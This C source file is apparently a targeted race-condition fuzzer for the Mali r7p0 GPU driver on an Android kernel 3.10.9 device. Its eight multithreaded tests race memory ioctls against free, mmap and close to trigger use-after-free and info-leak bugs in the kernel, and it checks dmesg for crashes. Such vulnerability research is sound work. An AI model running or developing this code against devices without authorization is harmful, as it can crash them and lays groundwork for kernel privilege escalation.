/*
 * mali_race_exploit.c — Targeted Mali GPU driver race condition fuzzer
 *
 * Prior Mali fuzzing (mali_fuzz_full, mali_fuzz_multithreaded) was either
 * single-threaded or random multi-threaded ops. This tool targets SPECIFIC
 * race conditions in the Mali r7p0 Midgard driver on kernel 3.10.9:
 *
 * TEST 1: mmap + MEM_FREE race
 *   Thread A: mmap(fd, gpu_va_offset, ...) 
 *   Thread B: MEM_FREE(gpu_va) simultaneously
 *   Goal: Page fault handler runs against freed region → dangling PTE
 *
 * TEST 2: MEM_FREE + SYNC race
 *   Thread A: SYNC(gpu_va, ...) - cache maintenance on live region
 *   Thread B: MEM_FREE(gpu_va) simultaneously
 *   Goal: SYNC accesses freed kbase_va_region internals
 *
 * TEST 3: MEM_FREE + FLAGS_CHANGE race
 *   Thread A: FLAGS_CHANGE(gpu_va, flags, mask) on live region
 *   Thread B: MEM_FREE(gpu_va) simultaneously
 *   Goal: FLAGS_CHANGE modifies freed region metadata
 *
 * TEST 4: MEM_FREE + MEM_COMMIT race
 *   Thread A: MEM_COMMIT(gpu_va, delta_pages)
 *   Thread B: MEM_FREE(gpu_va) simultaneously
 *   Goal: COMMIT allocates pages into freed region → kernel page leak/corruption
 *
 * TEST 5: close(fd) + mmap race
 *   Thread A: close(mali_fd) → triggers kbase_context_destroy
 *   Thread B: mmap(mali_fd, ...) simultaneously
 *   Goal: mmap runs during context destruction → UAF of kbase_context
 *
 * TEST 6: mmap + munmap + page fault race (triple race)
 *   Thread A: Rapid mmap/munmap of GPU memory
 *   Thread B: Read/write through previously-mmap'd pointer
 *   Thread C: MEM_FREE/MEM_ALLOC cycling the GPU region
 *   Goal: Page fault on stale VMA → wrong physical pages mapped
 *
 * Build: arm-linux-gnueabi-gcc -static -pie -fPIE -o mali_race mali_race_exploit.c -lpthread
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <unistd.h>

/* Mali UK interface constants */
#define DEV_PATH "/dev/mali0"
#define KBASE_FUNC_VERSION_CHECK     0
#define KBASE_FUNC_MEM_ALLOC         512
#define KBASE_FUNC_MEM_IMPORT        513
#define KBASE_FUNC_MEM_COMMIT        514
#define KBASE_FUNC_MEM_QUERY         515
#define KBASE_FUNC_MEM_FREE          516
#define KBASE_FUNC_MEM_FLAGS_CHANGE  517
#define KBASE_FUNC_SYNC              520
#define KBASE_FUNC_SET_FLAGS         530

/* UK result codes */
#define MALI_ERROR_NONE              0
#define MALI_ERROR_FUNCTION_FAILED   3

/* Mem alloc flags */
#define BASE_MEM_PROT_CPU_RD     (1U << 0)
#define BASE_MEM_PROT_CPU_WR     (1U << 1)
#define BASE_MEM_PROT_GPU_RD     (1U << 2)
#define BASE_MEM_PROT_GPU_WR     (1U << 3)
#define BASE_MEM_SAME_VA         (1U << 9)
#define BASE_MEM_COHERENT_SYSTEM (1U << 12)

/* Sync types */
#define KBASE_SYNC_TO_DEVICE     0
#define KBASE_SYNC_TO_CPU        1

/* Standard RW flags for allocation */
#define STD_FLAGS (BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR | \
                   BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR)

struct uk_header { uint32_t id; uint32_t ret; };

static unsigned int make_cmd(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, sz);
}

static int mali_open_ctx(void) {
    int fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;

    /* Version handshake */
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = KBASE_FUNC_VERSION_CHECK;
    hb[8] = 10; /* major=10 */
    if (ioctl(fd, make_cmd(16), hb) < 0) { close(fd); return -1; }

    /* Set flags */
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = KBASE_FUNC_SET_FLAGS;
    if (ioctl(fd, make_cmd(16), hb) < 0) { close(fd); return -1; }

    return fd;
}

static uint64_t mali_alloc(int fd, uint32_t pages, uint64_t flags) {
    uint8_t buf[56];
    memset(buf, 0, 56);
    ((struct uk_header*)buf)->id = KBASE_FUNC_MEM_ALLOC;
    *(uint64_t*)(buf + 8)  = pages;   /* va_pages */
    *(uint64_t*)(buf + 16) = pages;   /* commit_pages */
    *(uint64_t*)(buf + 32) = flags;
    if (ioctl(fd, make_cmd(56), buf) < 0) return 0;
    if (((struct uk_header*)buf)->id != MALI_ERROR_NONE) return 0;
    return *(uint64_t*)(buf + 40);     /* gpu_va */
}

static int mali_free(int fd, uint64_t va) {
    uint8_t buf[16];
    memset(buf, 0, 16);
    ((struct uk_header*)buf)->id = KBASE_FUNC_MEM_FREE;
    *(uint64_t*)(buf + 8) = va;
    int r = ioctl(fd, make_cmd(16), buf);
    return (r == 0 && ((struct uk_header*)buf)->id == MALI_ERROR_NONE) ? 0 : -1;
}

static int mali_sync(int fd, uint64_t va, uint64_t size, uint32_t type) {
    /* SYNC struct: header(8) + gpu_addr(8) + size(8) + type(4) + pad(4) = 32 */
    uint8_t buf[32];
    memset(buf, 0, 32);
    ((struct uk_header*)buf)->id = KBASE_FUNC_SYNC;
    *(uint64_t*)(buf + 8)  = va;
    *(uint64_t*)(buf + 16) = size;
    *(uint32_t*)(buf + 24) = type;
    return ioctl(fd, make_cmd(32), buf);
}

static int mali_flags_change(int fd, uint64_t va, uint64_t flags, uint64_t mask) {
    uint8_t buf[32];
    memset(buf, 0, 32);
    ((struct uk_header*)buf)->id = KBASE_FUNC_MEM_FLAGS_CHANGE;
    *(uint64_t*)(buf + 8)  = va;
    *(uint64_t*)(buf + 16) = flags;
    *(uint64_t*)(buf + 24) = mask;
    return ioctl(fd, make_cmd(32), buf);
}

static int mali_commit(int fd, uint64_t va, int64_t pages) {
    uint8_t buf[32];
    memset(buf, 0, 32);
    ((struct uk_header*)buf)->id = KBASE_FUNC_MEM_COMMIT;
    *(uint64_t*)(buf + 8) = va;
    *(int64_t*)(buf + 16) = pages;
    return ioctl(fd, make_cmd(32), buf);
}

/* ====================================================================== */
/* Shared state for race threads                                          */
/* ====================================================================== */
static volatile int g_go = 0;
static volatile int g_stop = 0;
static volatile uint64_t g_target_va = 0;
static int g_mali_fd = -1;

/* Barrier: both threads spin until g_go is set */
static void wait_go(void) { while (!g_go) { } }

/* ====================================================================== */
/* TEST 1: mmap + MEM_FREE race                                          */
/* ====================================================================== */
static volatile int t1_mmap_ok = 0;
static volatile int t1_fault = 0;

static void *t1_mmap_thread(void *arg) {
    (void)arg;
    wait_go();
    for (int i = 0; i < 5000 && !g_stop; i++) {
        /* mmap the GPU allocation to userspace */
        uint64_t offset = g_target_va;  /* Mali uses gpu_va as cookie/offset */
        void *ptr = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                        MAP_SHARED, g_mali_fd, (off_t)(offset << 12));
        if (ptr != MAP_FAILED) {
            __sync_fetch_and_add(&t1_mmap_ok, 1);
            /* Touch the mapping to trigger page fault */
            volatile uint32_t *p = (volatile uint32_t *)ptr;
            uint32_t val = *p;
            (void)val;
            *p = 0xDEAD0001;
            munmap(ptr, 4096);
        }
    }
    return NULL;
}

static void *t1_free_thread(void *arg) {
    (void)arg;
    wait_go();
    usleep(50); /* tiny delay to let mmap get ahead */
    for (int i = 0; i < 5000 && !g_stop; i++) {
        /* Free the target region */
        mali_free(g_mali_fd, g_target_va);
        /* Immediately reallocate (hope to get same VA) */
        uint64_t new_va = mali_alloc(g_mali_fd, 1, STD_FLAGS);
        if (new_va) g_target_va = new_va;
        /* No sleep — tight race */
    }
    return NULL;
}

static void test1_mmap_free_race(void) {
    fprintf(stderr, "\n=== TEST 1: mmap + MEM_FREE race ===\n");
    fprintf(stderr, "  Racing mmap(gpu_va) vs MEM_FREE(gpu_va)...\n");

    int crashes = 0;
    for (int trial = 0; trial < 10; trial++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(8);
            g_mali_fd = mali_open_ctx();
            if (g_mali_fd < 0) _exit(1);
            g_target_va = mali_alloc(g_mali_fd, 1, STD_FLAGS);
            if (!g_target_va) _exit(1);

            t1_mmap_ok = 0;
            g_go = 0; g_stop = 0;

            pthread_t t_mmap, t_free;
            pthread_create(&t_mmap, NULL, t1_mmap_thread, NULL);
            pthread_create(&t_free, NULL, t1_free_thread, NULL);

            usleep(1000);
            g_go = 1;

            pthread_join(t_mmap, NULL);
            pthread_join(t_free, NULL);

            fprintf(stderr, "  [%d] mmap_ok=%d\n", trial, t1_mmap_ok);
            close(g_mali_fd);
            _exit(0);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            int sig = WTERMSIG(status);
            fprintf(stderr, "  [%d] KILLED by signal %d *** CRASH ***\n", trial, sig);
            crashes++;
        } else if (WIFEXITED(status) && WEXITSTATUS(status) == 14) {
            fprintf(stderr, "  [%d] TIMEOUT (SIGALRM) *** HANG ***\n", trial);
            crashes++;
        }
    }
    fprintf(stderr, "  Result: %d crashes/hangs in 10 trials\n", crashes);
}

/* ====================================================================== */
/* TEST 2: MEM_FREE + SYNC race                                          */
/* ====================================================================== */
static volatile int t2_sync_ok = 0;
static volatile int t2_sync_err = 0;

static void *t2_sync_thread(void *arg) {
    (void)arg;
    wait_go();
    for (int i = 0; i < 10000 && !g_stop; i++) {
        uint64_t va = g_target_va;
        int r = mali_sync(g_mali_fd, va, 4096, i % 2); /* alternate TO_DEVICE/TO_CPU */
        if (r == 0)
            __sync_fetch_and_add(&t2_sync_ok, 1);
        else
            __sync_fetch_and_add(&t2_sync_err, 1);
    }
    return NULL;
}

static void *t2_free_alloc_thread(void *arg) {
    (void)arg;
    wait_go();
    for (int i = 0; i < 10000 && !g_stop; i++) {
        uint64_t va = g_target_va;
        mali_free(g_mali_fd, va);
        uint64_t new_va = mali_alloc(g_mali_fd, 1, STD_FLAGS);
        if (new_va) g_target_va = new_va;
    }
    return NULL;
}

static void test2_free_sync_race(void) {
    fprintf(stderr, "\n=== TEST 2: MEM_FREE + SYNC race ===\n");
    fprintf(stderr, "  Racing SYNC(gpu_va) vs MEM_FREE + re-ALLOC...\n");

    int crashes = 0;
    for (int trial = 0; trial < 10; trial++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(8);
            g_mali_fd = mali_open_ctx();
            if (g_mali_fd < 0) _exit(1);
            g_target_va = mali_alloc(g_mali_fd, 1, STD_FLAGS);
            if (!g_target_va) _exit(1);

            t2_sync_ok = 0; t2_sync_err = 0;
            g_go = 0; g_stop = 0;

            pthread_t t_sync, t_free;
            pthread_create(&t_sync, NULL, t2_sync_thread, NULL);
            pthread_create(&t_free, NULL, t2_free_alloc_thread, NULL);

            usleep(1000);
            g_go = 1;

            pthread_join(t_sync, NULL);
            pthread_join(t_free, NULL);

            fprintf(stderr, "  [%d] sync_ok=%d sync_err=%d\n",
                    trial, t2_sync_ok, t2_sync_err);
            close(g_mali_fd);
            _exit(0);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            fprintf(stderr, "  [%d] KILLED by signal %d *** CRASH ***\n",
                    trial, WTERMSIG(status));
            crashes++;
        }
    }
    fprintf(stderr, "  Result: %d crashes/hangs in 10 trials\n", crashes);
}

/* ====================================================================== */
/* TEST 3: MEM_FREE + FLAGS_CHANGE race                                   */
/* ====================================================================== */
static volatile int t3_fc_ok = 0;
static volatile int t3_fc_err = 0;

static void *t3_flags_thread(void *arg) {
    (void)arg;
    wait_go();
    /* Flag mutation patterns that exercise deep code paths */
    uint64_t masks[] = {
        BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR,
        BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR,
        BASE_MEM_COHERENT_SYSTEM,
        0xFFFFFFFFFFFFFFFFULL, /* all bits */
    };
    for (int i = 0; i < 10000 && !g_stop; i++) {
        uint64_t va = g_target_va;
        uint64_t mask = masks[i % 4];
        uint64_t flags = (i & 1) ? mask : 0;
        int r = mali_flags_change(g_mali_fd, va, flags, mask);
        if (r == 0)
            __sync_fetch_and_add(&t3_fc_ok, 1);
        else
            __sync_fetch_and_add(&t3_fc_err, 1);
    }
    return NULL;
}

static void test3_free_flags_race(void) {
    fprintf(stderr, "\n=== TEST 3: MEM_FREE + FLAGS_CHANGE race ===\n");
    fprintf(stderr, "  Racing FLAGS_CHANGE vs MEM_FREE + re-ALLOC...\n");

    int crashes = 0;
    for (int trial = 0; trial < 10; trial++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(8);
            g_mali_fd = mali_open_ctx();
            if (g_mali_fd < 0) _exit(1);
            g_target_va = mali_alloc(g_mali_fd, 1, STD_FLAGS);
            if (!g_target_va) _exit(1);

            t3_fc_ok = 0; t3_fc_err = 0;
            g_go = 0; g_stop = 0;

            pthread_t t_flags, t_free;
            pthread_create(&t_flags, NULL, t3_flags_thread, NULL);
            pthread_create(&t_free, NULL, t2_free_alloc_thread, NULL); /* reuse */

            usleep(1000);
            g_go = 1;

            pthread_join(t_flags, NULL);
            pthread_join(t_free, NULL);

            fprintf(stderr, "  [%d] fc_ok=%d fc_err=%d\n",
                    trial, t3_fc_ok, t3_fc_err);
            close(g_mali_fd);
            _exit(0);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            fprintf(stderr, "  [%d] KILLED by signal %d *** CRASH ***\n",
                    trial, WTERMSIG(status));
            crashes++;
        }
    }
    fprintf(stderr, "  Result: %d crashes/hangs in 10 trials\n", crashes);
}

/* ====================================================================== */
/* TEST 4: MEM_FREE + MEM_COMMIT race (growable region)                   */
/* ====================================================================== */
static volatile int t4_commit_ok = 0;

static void *t4_commit_thread(void *arg) {
    (void)arg;
    wait_go();
    for (int i = 0; i < 10000 && !g_stop; i++) {
        uint64_t va = g_target_va;
        /* Alternate between growing and shrinking */
        int64_t delta = (i & 1) ? 1 : -1;
        int r = mali_commit(g_mali_fd, va, delta);
        if (r == 0) __sync_fetch_and_add(&t4_commit_ok, 1);
    }
    return NULL;
}

static void test4_free_commit_race(void) {
    fprintf(stderr, "\n=== TEST 4: MEM_FREE + MEM_COMMIT race ===\n");
    fprintf(stderr, "  Racing MEM_COMMIT(grow/shrink) vs MEM_FREE + re-ALLOC...\n");

    int crashes = 0;
    for (int trial = 0; trial < 10; trial++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(8);
            g_mali_fd = mali_open_ctx();
            if (g_mali_fd < 0) _exit(1);

            /* Allocate GROWABLE region: va_pages=4, commit=2, extent=2 */
            uint8_t ab[56];
            memset(ab, 0, 56);
            ((struct uk_header*)ab)->id = KBASE_FUNC_MEM_ALLOC;
            *(uint64_t*)(ab + 8)  = 4;   /* va_pages */
            *(uint64_t*)(ab + 16) = 2;   /* commit_pages */
            *(uint64_t*)(ab + 24) = 2;   /* extent */
            *(uint64_t*)(ab + 32) = STD_FLAGS | (1ULL << 9); /* GROW_ON_GPF */
            if (ioctl(g_mali_fd, make_cmd(56), ab) < 0) _exit(1);
            g_target_va = *(uint64_t*)(ab + 40);
            if (!g_target_va) _exit(1);

            t4_commit_ok = 0;
            g_go = 0; g_stop = 0;

            pthread_t t_commit, t_free;
            pthread_create(&t_commit, NULL, t4_commit_thread, NULL);
            pthread_create(&t_free, NULL, t2_free_alloc_thread, NULL);

            usleep(1000);
            g_go = 1;

            pthread_join(t_commit, NULL);
            pthread_join(t_free, NULL);

            fprintf(stderr, "  [%d] commit_ok=%d\n", trial, t4_commit_ok);
            close(g_mali_fd);
            _exit(0);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            fprintf(stderr, "  [%d] KILLED by signal %d *** CRASH ***\n",
                    trial, WTERMSIG(status));
            crashes++;
        }
    }
    fprintf(stderr, "  Result: %d crashes/hangs in 10 trials\n", crashes);
}

/* ====================================================================== */
/* TEST 5: close(fd) + mmap race                                          */
/* ====================================================================== */
static volatile int t5_mmap_ok = 0;
static volatile int t5_fd = -1;
static volatile uint64_t t5_va = 0;

static void *t5_mmap_thread(void *arg) {
    (void)arg;
    wait_go();
    for (int i = 0; i < 2000 && !g_stop; i++) {
        int fd = t5_fd;
        if (fd < 0) break;
        void *ptr = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                        MAP_SHARED, fd, (off_t)(t5_va << 12));
        if (ptr != MAP_FAILED) {
            __sync_fetch_and_add(&t5_mmap_ok, 1);
            munmap(ptr, 4096);
        }
    }
    return NULL;
}

static void *t5_close_thread(void *arg) {
    (void)arg;
    wait_go();
    usleep(100);
    close(t5_fd);
    t5_fd = -1;
    return NULL;
}

static void test5_close_mmap_race(void) {
    fprintf(stderr, "\n=== TEST 5: close(fd) + mmap race ===\n");
    fprintf(stderr, "  Racing mmap vs close(fd) (context destruction)...\n");

    int crashes = 0;
    for (int trial = 0; trial < 20; trial++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);
            t5_fd = mali_open_ctx();
            if (t5_fd < 0) _exit(1);
            t5_va = mali_alloc(t5_fd, 1, STD_FLAGS);
            if (!t5_va) _exit(1);

            t5_mmap_ok = 0;
            g_go = 0; g_stop = 0;

            pthread_t t_mmap, t_close;
            pthread_create(&t_mmap, NULL, t5_mmap_thread, NULL);
            pthread_create(&t_close, NULL, t5_close_thread, NULL);

            usleep(500);
            g_go = 1;

            pthread_join(t_close, NULL);
            g_stop = 1;
            pthread_join(t_mmap, NULL);

            fprintf(stderr, "  [%d] mmap_ok=%d\n", trial, t5_mmap_ok);
            _exit(0);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            fprintf(stderr, "  [%d] KILLED by signal %d *** CRASH ***\n",
                    trial, WTERMSIG(status));
            crashes++;
        }
    }
    fprintf(stderr, "  Result: %d crashes/hangs in 20 trials\n", crashes);
}

/* ====================================================================== */
/* TEST 6: Triple race — mmap + touch + free/alloc cycle                  */
/* ====================================================================== */
static volatile void *t6_ptr = NULL;
static volatile int t6_touch_ok = 0;
static volatile int t6_touch_fault = 0;

static void t6_sigbus(int sig) {
    (void)sig;
    __sync_fetch_and_add(&t6_touch_fault, 1);
    /* Can't safely resume — exit child */
    _exit(42);
}

static void *t6_touch_thread(void *arg) {
    (void)arg;
    wait_go();
    for (int i = 0; i < 20000 && !g_stop; i++) {
        volatile uint32_t *p = (volatile uint32_t *)t6_ptr;
        if (p) {
            uint32_t val = *p;
            *p = val + 1;
            __sync_fetch_and_add(&t6_touch_ok, 1);
        }
    }
    return NULL;
}

static void *t6_mmap_cycle_thread(void *arg) {
    (void)arg;
    wait_go();
    for (int i = 0; i < 5000 && !g_stop; i++) {
        uint64_t va = g_target_va;
        void *ptr = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                        MAP_SHARED, g_mali_fd, (off_t)(va << 12));
        if (ptr != MAP_FAILED) {
            t6_ptr = ptr;
            usleep(10);
            t6_ptr = NULL;
            munmap(ptr, 4096);
        }
    }
    return NULL;
}

static void test6_triple_race(void) {
    fprintf(stderr, "\n=== TEST 6: Triple race (mmap+touch+free/alloc) ===\n");
    fprintf(stderr, "  Three threads: mmap cycle, page touch, free/alloc cycle...\n");

    int crashes = 0;
    for (int trial = 0; trial < 10; trial++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(8);
            signal(SIGBUS, t6_sigbus);
            signal(SIGSEGV, t6_sigbus);

            g_mali_fd = mali_open_ctx();
            if (g_mali_fd < 0) _exit(1);
            g_target_va = mali_alloc(g_mali_fd, 1, STD_FLAGS);
            if (!g_target_va) _exit(1);

            t6_ptr = NULL;
            t6_touch_ok = 0; t6_touch_fault = 0;
            g_go = 0; g_stop = 0;

            pthread_t t_touch, t_mmap, t_free;
            pthread_create(&t_touch, NULL, t6_touch_thread, NULL);
            pthread_create(&t_mmap, NULL, t6_mmap_cycle_thread, NULL);
            pthread_create(&t_free, NULL, t2_free_alloc_thread, NULL);

            usleep(1000);
            g_go = 1;

            pthread_join(t_free, NULL);
            g_stop = 1;
            pthread_join(t_mmap, NULL);
            pthread_join(t_touch, NULL);

            fprintf(stderr, "  [%d] touch_ok=%d faults=%d\n",
                    trial, t6_touch_ok, t6_touch_fault);
            close(g_mali_fd);
            _exit(0);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            int sig = WTERMSIG(status);
            fprintf(stderr, "  [%d] KILLED by signal %d *** CRASH ***\n", trial, sig);
            crashes++;
        } else if (WIFEXITED(status) && WEXITSTATUS(status) == 42) {
            fprintf(stderr, "  [%d] SIGBUS/SIGSEGV caught (memory fault) *** INTERESTING ***\n", trial);
            crashes++;
        }
    }
    fprintf(stderr, "  Result: %d crashes/interesting in 10 trials\n", crashes);
}

/* ====================================================================== */
/* TEST 7: MEM_IMPORT race (dma_buf import + free)                        */
/* ====================================================================== */
static volatile int t7_import_ok = 0;
static volatile int t7_ion_fd = -1;

static void *t7_import_thread(void *arg) {
    (void)arg;
    wait_go();
    for (int i = 0; i < 5000 && !g_stop; i++) {
        /* Import an ION dma_buf fd into Mali */
        uint8_t buf[48];
        memset(buf, 0, 48);
        ((struct uk_header*)buf)->id = KBASE_FUNC_MEM_IMPORT;
        *(uint64_t*)(buf + 8) = (uint64_t)t7_ion_fd;  /* phandle = dma_buf fd */
        *(uint64_t*)(buf + 16) = 1;  /* type = UMP/dma-buf */
        int r = ioctl(g_mali_fd, make_cmd(48), buf);
        if (r == 0 && ((struct uk_header*)buf)->id == MALI_ERROR_NONE) {
            uint64_t gpu_va = *(uint64_t*)(buf + 32);
            __sync_fetch_and_add(&t7_import_ok, 1);
            /* Immediately free */
            mali_free(g_mali_fd, gpu_va);
        }
    }
    return NULL;
}

static void *t7_ion_cycle_thread(void *arg) {
    (void)arg;
    int ion_fd = open("/dev/ion", O_RDONLY | O_CLOEXEC);
    if (ion_fd < 0) return NULL;

    wait_go();
    for (int i = 0; i < 5000 && !g_stop; i++) {
        /* Allocate ION buffer */
        struct {
            uint64_t len;
            uint64_t align;
            uint32_t heap_id_mask;
            uint32_t flags;
            int32_t fd;
        } alloc_data = { .len = 4096, .align = 4096, .heap_id_mask = 1, .flags = 0, .fd = -1 };

        if (ioctl(ion_fd, 0xc0144900, &alloc_data) == 0 && alloc_data.fd >= 0) {
            t7_ion_fd = alloc_data.fd;
            usleep(50);
            close(alloc_data.fd);
            t7_ion_fd = -1;
        }
    }
    close(ion_fd);
    return NULL;
}

static void test7_import_race(void) {
    fprintf(stderr, "\n=== TEST 7: MEM_IMPORT + ION free race ===\n");
    fprintf(stderr, "  Racing Mali MEM_IMPORT(dma_buf) vs close(dma_buf_fd)...\n");

    int crashes = 0;
    for (int trial = 0; trial < 10; trial++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(8);
            g_mali_fd = mali_open_ctx();
            if (g_mali_fd < 0) _exit(1);

            t7_import_ok = 0; t7_ion_fd = -1;
            g_go = 0; g_stop = 0;

            pthread_t t_import, t_ion;
            pthread_create(&t_import, NULL, t7_import_thread, NULL);
            pthread_create(&t_ion, NULL, t7_ion_cycle_thread, NULL);

            usleep(1000);
            g_go = 1;

            pthread_join(t_import, NULL);
            g_stop = 1;
            pthread_join(t_ion, NULL);

            fprintf(stderr, "  [%d] imports=%d\n", trial, t7_import_ok);
            close(g_mali_fd);
            _exit(0);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            fprintf(stderr, "  [%d] KILLED by signal %d *** CRASH ***\n",
                    trial, WTERMSIG(status));
            crashes++;
        }
    }
    fprintf(stderr, "  Result: %d crashes in 10 trials\n", crashes);
}

/* ====================================================================== */
/* TEST 8: MEM_QUERY concurrent with MEM_FREE — info leak                 */
/* ====================================================================== */
static volatile uint64_t t8_leaked_value = 0;
static volatile int t8_anomalies = 0;

static void *t8_query_thread(void *arg) {
    (void)arg;
    wait_go();
    for (int i = 0; i < 20000 && !g_stop; i++) {
        uint64_t va = g_target_va;
        /* Query COMMIT_SIZE */
        uint8_t buf[32];
        memset(buf, 0, 32);
        ((struct uk_header*)buf)->id = KBASE_FUNC_MEM_QUERY;
        *(uint64_t*)(buf + 8)  = va;
        *(uint64_t*)(buf + 16) = 1; /* COMMIT_SIZE */
        int r = ioctl(g_mali_fd, make_cmd(32), buf);
        if (r == 0 && ((struct uk_header*)buf)->id == MALI_ERROR_NONE) {
            uint64_t value = *(uint64_t*)(buf + 24);
            /* Check for unexpected values — freed region metadata leak */
            if (value > 0x1000 || (value != 0 && value != 1 && value != 2 && value != 4)) {
                t8_leaked_value = value;
                __sync_fetch_and_add(&t8_anomalies, 1);
            }
        }
    }
    return NULL;
}

static void test8_query_race(void) {
    fprintf(stderr, "\n=== TEST 8: MEM_QUERY + MEM_FREE race (info leak) ===\n");
    fprintf(stderr, "  Racing MEM_QUERY(COMMIT_SIZE) vs MEM_FREE + re-ALLOC...\n");

    int anomalies = 0;
    for (int trial = 0; trial < 10; trial++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(8);
            g_mali_fd = mali_open_ctx();
            if (g_mali_fd < 0) _exit(1);
            g_target_va = mali_alloc(g_mali_fd, 1, STD_FLAGS);
            if (!g_target_va) _exit(1);

            t8_anomalies = 0; t8_leaked_value = 0;
            g_go = 0; g_stop = 0;

            pthread_t t_query, t_free;
            pthread_create(&t_query, NULL, t8_query_thread, NULL);
            pthread_create(&t_free, NULL, t2_free_alloc_thread, NULL);

            usleep(1000);
            g_go = 1;

            pthread_join(t_query, NULL);
            pthread_join(t_free, NULL);

            if (t8_anomalies > 0) {
                fprintf(stderr, "  [%d] *** ANOMALY: %d unexpected query values, last=0x%llx ***\n",
                        trial, t8_anomalies, (unsigned long long)t8_leaked_value);
            } else {
                fprintf(stderr, "  [%d] clean\n", trial);
            }
            close(g_mali_fd);
            _exit(t8_anomalies > 0 ? 99 : 0);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            fprintf(stderr, "  [%d] KILLED by signal %d *** CRASH ***\n",
                    trial, WTERMSIG(status));
            anomalies++;
        } else if (WIFEXITED(status) && WEXITSTATUS(status) == 99) {
            anomalies++;
        }
    }
    fprintf(stderr, "  Result: %d anomaly/crash trials out of 10\n", anomalies);
}

/* ====================================================================== */
/* main                                                                   */
/* ====================================================================== */
int main(void) {
    fprintf(stderr, "=== Mali r7p0 Targeted Race Condition Fuzzer ===\n");
    fprintf(stderr, "SM-T377A kernel 3.10.9 | /dev/mali0 | 8 tests\n\n");

    /* Quick sanity: can we open Mali? */
    int fd = mali_open_ctx();
    if (fd < 0) {
        fprintf(stderr, "[-] Cannot open /dev/mali0: %s\n", strerror(errno));
        return 1;
    }
    uint64_t va = mali_alloc(fd, 1, STD_FLAGS);
    fprintf(stderr, "[+] Mali context OK, test alloc VA=0x%llx\n", (unsigned long long)va);
    mali_free(fd, va);
    close(fd);

    /* Check dmesg before */
    fprintf(stderr, "\n--- Pre-test dmesg (mali/kbase) ---\n");
    system("dmesg 2>/dev/null | tail -5 | grep -iE 'mali|kbase|oops|bug|panic' 2>/dev/null");

    test1_mmap_free_race();
    test2_free_sync_race();
    test3_free_flags_race();
    test4_free_commit_race();
    test5_close_mmap_race();
    test6_triple_race();
    test7_import_race();
    test8_query_race();

    /* Check dmesg after */
    fprintf(stderr, "\n--- Post-test dmesg (mali/kbase) ---\n");
    system("dmesg 2>/dev/null | tail -30 | grep -iE 'mali|kbase|oops|bug|panic|fault|corrupt' 2>/dev/null");

    fprintf(stderr, "\n=== Done ===\n");
    return 0;
}
